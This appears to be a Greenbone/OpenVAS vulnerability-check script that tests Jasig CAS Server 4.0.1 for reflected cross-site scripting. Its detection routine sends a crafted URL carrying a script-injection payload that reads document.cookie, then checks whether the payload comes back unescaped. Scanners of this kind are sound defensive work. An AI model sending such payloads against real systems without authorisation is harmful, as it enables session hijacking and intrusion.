CPE = "cpe:/a:apereo:central_authentication_service";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.806502" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2015-10-19 13:02:46 +0530 (Mon, 19 Oct 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "Jasig Central Authentication Service Server Multiple Cross Site Scripting Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with Jasig Central Authentication Service Server
  and is prone to multiple cross site scripting vulnerabilities." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks whether it is possible
  to read a cookie." );
	script_tag( name: "insight", value: "The following vulnerabilities exist:

  - OpenID client does not validate input to the 'username' parameter while login
  before returning it to users.

  - OAuth server does not validate input to the 'redirect_uri' parameter before
  returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary script code in a user's browser session within
  the trust relationship between their browser and the server." );
	script_tag( name: "affected", value: "Jasig Central Authentication Service Server version 4.0.1." );
	script_tag( name: "solution", value: "Upgrade to version 4.0.2 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2015/Sep/88" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/133630" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/536510" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_jasig_cas_server_detect.sc" );
	script_mandatory_keys( "Jasig CAS server/Installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/openid/username\"\nonmouseover=\"<script>alert(document.cookie);</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\);</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}

